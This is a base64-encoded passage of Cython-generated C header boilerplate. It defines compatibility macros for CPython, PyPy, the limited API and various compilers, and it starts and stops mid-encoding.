UVfU0FGRV9NQUNST1MgMFxuICAjdW5kZWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgI2RlZmluZSBDWVRIT05fQVNTVU1FX1NBRkVfU0laRSAwXG4gICN1bmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgI2RlZmluZSBDWVRIT05fVU5QQUNLX01FVEhPRFMgMFxuICAjdW5kZWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFXG4gICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDBcbiAgI3VuZGVmIENZVEhPTl9GQVNUX0dJTFxuICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwXG4gICN1bmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjZGVmaW5lIENZVEhPTl9NRVRIX0ZBU1RDQUxMIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApXG4gICN1bmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgI2RlZmluZSBDWVRIT05fRkFTVF9QWUNBTEwgMFxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfU1lTX01PTklUT1JJTkdcbiAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIDBcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDBcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgKF9fUFlYX0xJTUlURURfVkVSU0lPTl9IRVggPj0gMHgwMzBBMDAwMClcbiAgI2VuZGlmXG4gICN1bmRlZiBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlNcbiAgI2RlZmluZSBDWVRIT05fVVNFX0RJQ1RfVkVSU0lPTlMgMFxuICAjdW5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAjZGVmaW5lIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgMFxuICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0NcbiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMFxuICAjZW5kaWZcbiAgI3VuZGVmIENZVEhPTl9VU0VfRlJFRUxJU1RTXG4gICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgMFxuI2Vsc2VcbiAgI2RlZmluZSBDWVRIT05fQ09NUElMSU5HX0lOX1BZUFkgMFxuICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAxXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAwXG4gICNkZWZpbmUgQ1lUSE9OX0NPTVBJTElOR19JTl9HUkFBTCAwXG4gICNpZmRlZiBQeV9HSUxfRElTQUJMRURcbiAgICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDFcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HIDBcbiAgI2VuZGlmXG4gICNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwQTAwMDBcbiAgICAjdW5kZWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMVxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fVVNFX1RZUEVfU0xPVFMpXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RZUEVfU0xPVFMgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RZUEVfU1BFQ1NcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVFlQRV9TUEVDUyAwXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUFxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWVRZUEVfTE9PS1VQIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMgMVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgI3VuZGVmIENZVEhPTl9VU0VfUFlMSVNUX0lOVEVSTkFMU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTKVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9VTklDT0RFX0lOVEVSTkFMUyAxXG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkcgfHwgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBBMlxuICAgICN1bmRlZiBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1VOSUNPREVfV1JJVEVSIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9VTklDT0RFX1dSSVRFUilcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfVU5JQ09ERV9XUklURVIgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMgMFxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgI3VuZGVmIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlNcbiAgICAjZGVmaW5lIENZVEhPTl9BVk9JRF9USFJFQURfVU5TQUZFX0JPUlJPV0VEX1JFRlMgMVxuICAjZWxpZiAhZGVmaW5lZChDWVRIT05fQVZPSURfVEhSRUFEX1VOU0FGRV9CT1JST1dFRF9SRUZTKVxuICAgICNkZWZpbmUgQ1lUSE9OX0FWT0lEX1RIUkVBRF9VTlNBRkVfQk9SUk9XRURfUkVGUyAwXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1NcbiAgICAjZGVmaW5lIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICNkZWZpbmUgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVU5QQUNLX01FVEhPRFNcbiAgICAjZGVmaW5lIENZVEhPTl9VTlBBQ0tfTUVUSE9EUyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuICAgICNkZWZpbmUgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFIDFcbiAgI2VuZGlmXG4gICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgICN1bmRlZiBDWVRIT05fRkFTVF9HSUxcbiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAwXG4gICNlbGlmICFkZWZpbmVkKENZVEhPTl9GQVNUX0dJTClcbiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX0dJTCAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE2KVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAgICNkZWZpbmUgQ1lUSE9OX01FVEhfRkFTVENBTEwgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fRkFTVF9QWUNBTExcbiAgICAjZGVmaW5lIENZVEhPTl9GQVNUX1BZQ0FMTCAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9QRVA0ODdfSU5JVF9TVUJDTEFTU1xuICAgICNkZWZpbmUgQ1lUSE9OX1BFUDQ4N19JTklUX1NVQkNMQVNTIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gICAgI2RlZmluZSBDWVRIT05fUEVQNDg5X01VTFRJX1BIQVNFX0lOSVQgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9NT0RVTEVfU1RBVEUgMFxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1NZU19NT05JVE9SSU5HIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEIxKVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX1RQX0ZJTkFMSVpFIDFcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9BTV9TRU5EXG4gICAgI2RlZmluZSBDWVRIT05fVVNFX0FNX1NFTkQgMVxuICAjZW5kaWZcbiAgI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTl9GUkVFVEhSRUFESU5HXG4gICAgI3VuZGVmIENZVEhPTl9VU0VfRElDVF9WRVJTSU9OU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TIDBcbiAgI2VsaWYgIWRlZmluZWQoQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TKVxuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9ESUNUX1ZFUlNJT05TICAoUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE1ICYmICFDWVRIT05fVVNFX01PRFVMRV9TVEFURSlcbiAgI2VuZGlmXG4gICNpZm5kZWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAxXG4gICNlbmRpZlxuICAjaWZuZGVmIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0NcbiAgICAjZGVmaW5lIENZVEhPTl9VUERBVEVfREVTQ1JJUFRPUl9ET0MgMVxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fVVNFX0ZSRUVMSVNUU1xuICAgICNkZWZpbmUgQ1lUSE9OX1VTRV9GUkVFTElTVFMgKCFDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElORylcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX0ZBU1RfUFlDQ0FMTFxuI2RlZmluZSBDWVRIT05fRkFTVF9QWUNDQUxMICBDWVRIT05fRkFTVF9QWUNBTExcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVkVDVE9SQ0FMTFxuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNkZWZpbmUgQ1lUSE9OX1ZFQ1RPUkNBTEwgIChfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYID49IDB4MDMwQzAwMDApXG4jZWxzZVxuI2RlZmluZSBDWVRIT05fVkVDVE9SQ0FMTCAgKENZVEhPTl9GQVNUX1BZQ0NBTEwgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBCMSlcbiNlbmRpZlxuI2VuZGlmXG4jZGVmaW5lIENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMIChDWVRIT05fTUVUSF9GQVNUQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwODAwQjEpXG4jaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTXG4gICN1bmRlZiBTSElGVFxuICAjdW5kZWYgQkFTRVxuICAjdW5kZWYgTUFTS1xuICAjaWZkZWYgU0laRU9GX1ZPSURfUFxuICAgIGVudW0geyBfX3B5eF9jaGVja19zaXplb2Zfdm9pZHAgPSAxIC8gKGludCkoU0laRU9GX1ZPSURfUCA9PSBzaXplb2Yodm9pZCopKSB9O1xuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fTE9DS19BTkRfR0lMX0RFQURMT0NLX0FWT0lEQU5DRV9USU1FXG4gICNkZWZpbmUgQ1lUSE9OX0xPQ0tfQU5EX0dJTF9ERUFETE9DS19BVk9JREFOQ0VfVElNRSAxMDBcbiNlbmRpZlxuI2lmbmRlZiBfX2hhc19hdHRyaWJ1dGVcbiAgI2RlZmluZSBfX2hhc19hdHRyaWJ1dGUoeCkgMFxuI2VuZGlmXG4jaWZuZGVmIF9faGFzX2NwcF9hdHRyaWJ1dGVcbiAgI2RlZmluZSBfX2hhc19jcHBfYXR0cmlidXRlKHgpIDBcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fUkVTVFJJQ1RcbiAgI2lmIGRlZmluZWQoX19HTlVDX18pXG4gICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1QgX19yZXN0cmljdF9fXG4gICNlbGlmIGRlZmluZWQoX01TQ19WRVIpICYmIF9NU0NfVkVSID49IDE0MDBcbiAgICAjZGVmaW5lIENZVEhPTl9SRVNUUklDVCBfX3Jlc3RyaWN0XG4gICNlbGlmIGRlZmluZWQgKF9fU1REQ19WRVJTSU9OX18pICYmIF9fU1REQ19WRVJTSU9OX18gPj0gMTk5OTAxTFxuICAgICNkZWZpbmUgQ1lUSE9OX1JFU1RSSUNUIHJlc3RyaWN0XG4gICNlbHNlXG4gICAgI2RlZmluZSBDWVRIT05fUkVTVFJJQ1RcbiAgI2VuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX1VOVVNFRFxuICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cylcbiAgICBcbiAgICAjaWYgKChkZWZpbmVkKF9NU1ZDX0xBTkcpICYmIF9NU1ZDX0xBTkcgPj0gMjAxNzAzTCkgfHwgX19jcGx1c3BsdXMgPj0gMjAxNzAzTClcbiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKG1heWJlX3VudXNlZClcbiAgICAgICAgI2RlZmluZSBDWVRIT05fVU5VU0VEIFtbbWF5YmVfdW51c2VkXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBDWVRIT05fVU5VU0VEXG4jIGlmIGRlZmluZWQoX19HTlVDX18pXG4jICAgaWYgIShkZWZpbmVkKF9fY3BsdXNwbHVzKSkgfHwgKF9fR05VQ19fID4gMyB8fCAoX19HTlVDX18gPT0gMyAmJiBfX0dOVUNfTUlOT1JfXyA+PSA0KSlcbiMgICAgIGRlZmluZSBDWVRIT05fVU5VU0VEIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSlcbiMgICBlbHNlXG4jICAgICBkZWZpbmUgQ1lUSE9OX1VOVVNFRFxuIyAgIGVuZGlmXG4jIGVsaWYgZGVmaW5lZChfX0lDQykgfHwgKGRlZmluZWQoX19JTlRFTF9DT01QSUxFUikgJiYgIWRlZmluZWQoX01TQ19WRVIpKVxuIyAgIGRlZmluZSBDWVRIT05fVU5VU0VEIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSlcbiMgZWxzZVxuIyAgIGRlZmluZSBDWVRIT05fVU5VU0VEXG4jIGVuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX1VOVVNFRF9WQVJcbiMgIGlmIGRlZmluZWQoX19jcGx1c3BsdXMpXG4gICAgIHRlbXBsYXRlPGNsYXNzIFQ+IHZvaWQgQ1lUSE9OX1VOVVNFRF9WQVIoIGNvbnN0IFQmICkgeyB9XG4jICBlbHNlXG4jICAgIGRlZmluZSBDWVRIT05fVU5VU0VEX1ZBUih4KSAodm9pZCkoeClcbiMgIGVuZGlmXG4jZW5kaWZcbiNpZm5kZWYgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVJcbiAgI2RlZmluZSBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUih4KSBDWVRIT05fVU5VU0VEX1ZBUih4KVxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9OQ1BfVU5VU0VEXG4jIGlmIENZVEhPTl9DT01QSUxJTkdfSU5fQ1BZVEhPTiAmJiAhQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OX0ZSRUVUSFJFQURJTkdcbiMgIGRlZmluZSBDWVRIT05fTkNQX1VOVVNFRFxuIyBlbHNlXG4jICBkZWZpbmUgQ1lUSE9OX05DUF9VTlVTRUQgQ1lUSE9OX1VOVVNFRFxuIyBlbmRpZlxuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9VU0VfQ1BQX1NURF9NT1ZFXG4gICNpZiBkZWZpbmVkKF9fY3BsdXNwbHVzKSAmJiAoXFxcbiAgICBfX2NwbHVzcGx1cyA+PSAyMDExMDNMIHx8IChkZWZpbmVkKF9NU0NfVkVSKSAmJiBfTVNDX1ZFUiA+PSAxNjAwKSlcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQ1BQX1NURF9NT1ZFIDFcbiAgI2Vsc2VcbiAgICAjZGVmaW5lIENZVEhPTl9VU0VfQ1BQX1NURF9NT1ZFIDBcbiAgI2VuZGlmXG4jZW5kaWZcbiNkZWZpbmUgX19QeXhfdm9pZF90b19Ob25lKHZvaWRfcmVzdWx0KSAoKHZvaWQpKHZvaWRfcmVzdWx0KSwgUHlfSU5DUkVGKFB5X05vbmUpLCBQeV9Ob25lKVxuI2lmZGVmIF9NU0NfVkVSXG4gICAgI2lmbmRlZiBfTVNDX1NURElOVF9IX1xuICAgICAgICAjaWYgX01TQ19WRVIgPCAxMzAwXG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGNoYXIgICAgIHVpbnQ4X3Q7XG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIHNob3J0ICAgIHVpbnQxNl90O1xuICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBpbnQgICAgICB1aW50MzJfdDtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQ4ICAgdWludDhfdDtcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgX19pbnQxNiAgdWludDE2X3Q7XG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50MzIgIHVpbnQzMl90O1xuICAgICAgICAjZW5kaWZcbiAgICAjZW5kaWZcbiAgICAjaWYgX01TQ19WRVIgPCAxMzAwXG4gICAgICAgICNpZmRlZiBfV0lONjRcbiAgICAgICAgICAgIHR5cGVkZWYgdW5zaWduZWQgbG9uZyBsb25nICBfX3B5eF91aW50cHRyX3Q7XG4gICAgICAgICNlbHNlXG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIGludCAgICAgICAgX19weXhfdWludHB0cl90O1xuICAgICAgICAjZW5kaWZcbiAgICAjZWxzZVxuICAgICAgICAjaWZkZWYgX1dJTjY0XG4gICAgICAgICAgICB0eXBlZGVmIHVuc2lnbmVkIF9faW50NjQgICAgX19weXhfdWludHB0cl90O1xuICAgICAgICAjZWxzZVxuICAgICAgICAgICAgdHlwZWRlZiB1bnNpZ25lZCBfX2ludDMyICAgIF9fcHl4X3VpbnRwdHJfdDtcbiAgICAgICAgI2VuZGlmXG4gICAgI2VuZGlmXG4jZWxzZVxuICAgICNpbmNsdWRlIDxzdGRpbnQuaD5cbiAgICB0eXBlZGVmIHVpbnRwdHJfdCAgX19weXhfdWludHB0cl90O1xuI2VuZGlmXG4jaWZuZGVmIENZVEhPTl9GQUxMVEhST1VHSFxuICAjaWYgZGVmaW5lZChfX2NwbHVzcGx1cylcbiAgICBcbiAgICAjaWYgKChkZWZpbmVkKF9NU1ZDX0xBTkcpICYmIF9NU1ZDX0xBTkcgPj0gMjAxNzAzTCkgfHwgX19jcGx1c3BsdXMgPj0gMjAxNzAzTClcbiAgICAgICNpZiBfX2hhc19jcHBfYXR0cmlidXRlKGZhbGx0aHJvdWdoKVxuICAgICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSCBbW2ZhbGx0aHJvdWdoXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgICAjaWYgX19oYXNfY3BwX2F0dHJpYnV0ZShjbGFuZzo6ZmFsbHRocm91Z2gpXG4gICAgICAgICNkZWZpbmUgQ1lUSE9OX0ZBTExUSFJPVUdIIFtbY2xhbmc6OmZhbGx0aHJvdWdoXV1cbiAgICAgICNlbGlmIF9faGFzX2NwcF9hdHRyaWJ1dGUoZ251OjpmYWxsdGhyb3VnaClcbiAgICAgICAgI2RlZmluZSBDWVRIT05fRkFMTFRIUk9VR0ggW1tnbnU6OmZhbGx0aHJvdWdoXV1cbiAgICAgICNlbmRpZlxuICAgICNlbmRpZlxuICAjZW5kaWZcbiAgI2lmbmRlZiBDWVRIT05fRkFMTFRIUk9VR0hcbiAgICAjaWYgX19oYXNfYXR0cmlidXRlKGZhbGx0aHJvdWdoKVxuICAgICAgI2RlZmluZSBDWVRIT05fRkFMTFRIUk9VR0ggX19hdHRyaWJ1dGVfXygoZmFsbHRocm91Z2gpKVxuICAgICNlbHNlXG4gICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSFxuICAgICNlbmRpZlxuICAjZW5kaWZcbiAgI2lmIGRlZmluZWQoX19jbGFuZ19fKSAmJiBkZWZpbmVkKF9fYXBwbGVfYnVpbGRfdmVyc2lvbl9fKVxuICAgICNpZiBfX2FwcGxlX2J1aWxkX3ZlcnNpb25fXyA8IDcwMDAwMDBcbiAgICAgICN1bmRlZiAgQ1lUSE9OX0ZBTExUSFJPVUdIXG4gICAgICAjZGVmaW5lIENZVEhPTl9GQUxMVEhST1VHSFxuICAgICNlbmRpZlxuICAjZW5kaWZcbiNlbmRpZlxuI2lmbmRlZiBQeV9VTlJFQUNIQUJMRVxuICAjZGVmaW5lIFB5X1VOUkVBQ0hBQkxFKCkgIGFzc2VydCgwKTsgYWJvcnQoKVxuI2VuZGlmXG4jaWZkZWYgX19jcGx1c3BsdXNcbiAgdGVtcGxhdGUgPHR5cGVuYW1lIFQ+XG4gIHN0cnVjdCBfX1BZWF9JU19VTlNJR05FRF9JTVBMIHtzdGF0aWMgY29uc3QgYm9vbCB2YWx1ZSA9IFQoMCkgPCBUKC0xKTt9O1xuICAjZGVmaW5lIF9fUFlYX0lTX1VOU0lHTkVEKHR5cGUpIChfX1BZWF9JU19VTlNJR05FRF9JTVBMPHR5cGU+Ojp2YWx1ZSlcbiNlbHNlXG4gICNkZWZpbmUgX19QWVhfSVNfVU5TSUdORUQodHlwZSkgKCgodHlwZSktMSkgPiAwKVxuI2VuZGlmXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZID09IDFcbiAgI2RlZmluZSBfX1BZWF9ORUVEX1RQX1BSSU5UX1NMT1QgIChQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDgwMGI0ICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBBMDAwMClcbiNlbHNlXG4gICNkZWZpbmUgX19QWVhfTkVFRF9UUF9QUklOVF9TTE9UICAoUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA4MDBiNCAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwMDApXG4jZW5kaWZcbiNkZWZpbmUgX19QWVhfUkVJTlRFUlBSRVRfRlVOQ0lPTihmdW5jX3BvaW50ZXIsIG90aGVyX3BvaW50ZXIpICgoZnVuY19wb2ludGVyKSh2b2lkKCopKHZvaWQpKShvdGhlcl9wb2ludGVyKSlcblxuXG4jaWZuZGVmIENZVEhPTl9JTkxJTkVcbiAgI2lmIGRlZmluZWQoX19jbGFuZ19fKVxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBfX2lubGluZV9fIF9fYXR0cmlidXRlX18gKChfX3VudXNlZF9fKSlcbiAgI2VsaWYgZGVmaW5lZChfX0dOVUNfXylcbiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkUgX19pbmxpbmVfX1xuICAjZWxpZiBkZWZpbmVkKF9NU0NfVkVSKVxuICAgICNkZWZpbmUgQ1lUSE9OX0lOTElORSBfX2lubGluZVxuICAjZWxpZiBkZWZpbmVkIChfX1NURENfVkVSU0lPTl9fKSAmJiBfX1NURENfVkVSU0lPTl9fID49IDE5OTkwMUxcbiAgICAjZGVmaW5lIENZVEhPTl9JTkxJTkUgaW5saW5lXG4gICNlbHNlXG4gICAgI2RlZmluZSBDWVRIT05fSU5MSU5FXG4gICNlbmRpZlxuI2VuZGlmXG5cblxuI2RlZmluZSBfX1BZWF9CVUlMRF9QWV9TU0laRV9UICJuIlxuI2RlZmluZSBDWVRIT05fRk9STUFUX1NTSVpFX1QgInoiXG4jZGVmaW5lIF9fUHl4X0JVSUxUSU5fTU9EVUxFX05BTUUgImJ1aWx0aW5zIlxuI2RlZmluZSBfX1B5eF9EZWZhdWx0Q2xhc3NUeXBlIFB5VHlwZV9UeXBlXG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICNpZm5kZWYgQ09fT1BUSU1JWkVEXG4gICAgc3RhdGljIGludCBDT19PUFRJTUlaRUQ7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19ORVdMT0NBTFNcbiAgICBzdGF0aWMgaW50IENPX05FV0xPQ0FMUztcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX1ZBUkFSR1NcbiAgICBzdGF0aWMgaW50IENPX1ZBUkFSR1M7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19WQVJLRVlXT1JEU1xuICAgIHN0YXRpYyBpbnQgQ09fVkFSS0VZV09SRFM7XG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19BU1lOQ19HRU5FUkFUT1JcbiAgICBzdGF0aWMgaW50IENPX0FTWU5DX0dFTkVSQVRPUjtcbiAgICAjZW5kaWZcbiAgICAjaWZuZGVmIENPX0dFTkVSQVRPUlxuICAgIHN0YXRpYyBpbnQgQ09fR0VORVJBVE9SO1xuICAgICNlbmRpZlxuICAgICNpZm5kZWYgQ09fQ09ST1VUSU5FXG4gICAgc3RhdGljIGludCBDT19DT1JPVVRJTkU7XG4gICAgI2VuZGlmXG4jZWxzZVxuICAgICNpZm5kZWYgQ09fQ09ST1VUSU5FXG4gICAgICAjZGVmaW5lIENPX0NPUk9VVElORSAweDgwXG4gICAgI2VuZGlmXG4gICAgI2lmbmRlZiBDT19BU1lOQ19HRU5FUkFUT1JcbiAgICAgICNkZWZpbmUgQ09fQVNZTkNfR0VORVJBVE9SIDB4MjAwXG4gICAgI2VuZGlmXG4jZW5kaWZcbnN0YXRpYyBpbnQgX19QeXhfaW5pdF9jb192YXJpYWJsZXModm9pZCk7XG4jaWYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzA5MDBBNCB8fCBkZWZpbmVkKFB5X0lTX1RZUEUpXG4gICNkZWZpbmUgX19QeXhfSVNfVFlQRShvYiwgdHlwZSkgUHlfSVNfVFlQRShvYiwgdHlwZSlcbiNlbHNlXG4gICNkZWZpbmUgX19QeXhfSVNfVFlQRShvYiwgdHlwZSkgKCgoY29uc3QgUHlPYmplY3QqKW9iKS0+b2JfdHlwZSA9PSAodHlwZSkpXG4jZW5kaWZcbiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMEEwMEIxIHx8IGRlZmluZWQoUHlfSXMpXG4gICNkZWZpbmUgX19QeXhfUHlfSXMoeCwgeSkgIFB5X0lzKHgsIHkpXG4jZWxzZVxuICAjZGVmaW5lIF9fUHl4X1B5X0lzKHgsIHkpICgoeCkgPT0gKHkpKVxuI2VuZGlmX